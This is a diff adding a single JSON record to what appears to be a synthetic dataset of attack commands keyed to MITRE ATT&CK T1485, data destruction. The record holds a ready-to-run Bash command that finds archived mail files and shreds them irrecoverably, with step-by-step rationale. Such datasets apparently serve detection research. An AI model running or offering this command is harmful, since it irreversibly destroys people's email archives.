@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "find /var/mail/archive -xdev -type f \\( -name '*.mbox' -o -name '*.eml' -o -name '*.pst' \\) -exec shred -n 3 -z -u -f {} +",
+  "explanation": "Securely overwrites and removes archived mail files in a designated mail archive directory.",
+  "rationale_steps": [
+    "Filter by known mail archive formats to maintain focus and reduce collateral impact.",
+    "Perform multi-pass overwrites to ensure content irrecoverability.",
+    "Unlink files after shredding to remove filesystem references."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-097d0d83-d79c6831",
+  "source_prompt_hash": "097d0d83",
+  "timestamp_utc": "2025-09-30T07:53:07.976516Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
